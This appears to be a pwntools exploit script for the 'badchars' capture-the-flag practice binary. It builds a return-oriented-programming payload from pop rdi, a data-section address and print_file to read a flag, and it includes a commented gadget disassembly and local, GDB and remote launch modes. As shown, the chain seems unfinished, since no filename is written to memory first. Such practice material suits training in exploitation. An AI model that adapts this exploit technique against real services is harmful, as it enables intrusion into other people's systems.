#!/usr/bin/python3
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

def find_ip(payload):
    p = process(exe)
    p.sendlineafter('> ', payload)
    
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    ip_offset = cyclic_find(p.corefile.pc)  # x86
    #ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset

# Specify your GDB script here for debugging
gdbscript = '''
break main
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './badchars'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'

#===========================================================
#         Trying to figure out questionableGadgets
#===========================================================
"""
pwndbg> disass questionableGadgets 
Dump of assembler code for function questionableGadgets:
   0x0000000000400628 <+0>:	xlat   BYTE PTR ds:[rbx]
   0x0000000000400629 <+1>:	ret    
   0x000000000040062a <+2>:	pop    rdx
   0x000000000040062b <+3>:	pop    rcx
   0x000000000040062c <+4>:	add    rcx,0x3ef2
   0x0000000000400633 <+11>:	bextr  rbx,rcx,rdx
   0x0000000000400638 <+16>:	ret    
   0x0000000000400639 <+17>:	stos   BYTE PTR es:[rdi],al --> copies al into es:[rdi]
   0x000000000040063a <+18>:	ret    
   0x000000000040063b <+19>:	nop    DWORD PTR [rax+rax*1+0x0]
"""

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

offset = 40 # find_ip(cyclic(100))

io = start()

# Note that these are all @plt addresses
# Obtained via gdb: info functions
print_file = 0x0000000000400510

# objdump -h | grep data
data_section = 0x0000000000601028 + 0x4

# 0x00000000004006a3: pop rdi; ret; 
pop_rdi = 0x00000000004006a3

payload = flat({
	offset: [
        pop_rdi,
        data_section,
        print_file
    ]
})

io.sendlineafter("> ", payload)
io.recvlineS()
flag = io.recvlineS()
log.success(flag)
